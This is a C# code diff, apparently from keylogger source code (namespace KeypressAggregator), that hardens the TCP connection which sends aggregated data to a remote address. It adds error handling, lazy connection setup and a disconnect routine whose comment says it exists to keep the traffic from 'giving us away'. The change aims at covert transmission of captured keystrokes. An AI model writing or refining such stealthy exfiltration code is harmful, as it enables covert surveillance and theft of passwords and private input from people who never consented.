@@ -20,10 +20,18 @@ namespace KeypressAggregator
         /// <returns></returns>
         public static TcpState GetState(this TcpClient tcpClient)
         {
-            var foo = IPGlobalProperties.GetIPGlobalProperties()
+            try
+            {
+                var foo = IPGlobalProperties.GetIPGlobalProperties()
               .GetActiveTcpConnections()
               .SingleOrDefault(x => x.LocalEndPoint.Equals(tcpClient.Client.LocalEndPoint));
-            return foo != null ? foo.State : TcpState.Unknown;
+                return foo != null ? foo.State : TcpState.Unknown;
+            }
+            catch
+            {
+                return TcpState.Unknown;
+            }
+            
         }
     }
     
@@ -77,6 +85,10 @@ namespace KeypressAggregator
         /// </summary>
         private bool connect()
         {
+            if (client == null)
+            {
+                client = new TcpClient(addr, port);
+            }
             if (client.GetState() != TcpState.Established)
             {
                 client.Connect(this.addr, this.port);
@@ -88,6 +100,19 @@ namespace KeypressAggregator
             else
             {
                 return true;
+            }
+        }
+
+        /// <summary>
+        /// Close the stream and client to prevent tcp shenanigans from giving us away.
+        /// </summary>
+        private void disconnect()
+        {
+            if (client != null)
+            {
+                client.GetStream().Close();
+                client.Close();
+                client = null;
             }
         }
 
@@ -135,6 +160,8 @@ namespace KeypressAggregator
 
             }
             stream.Flush();
+
+            disconnect();
         }
 
         public void Send(CI ci)
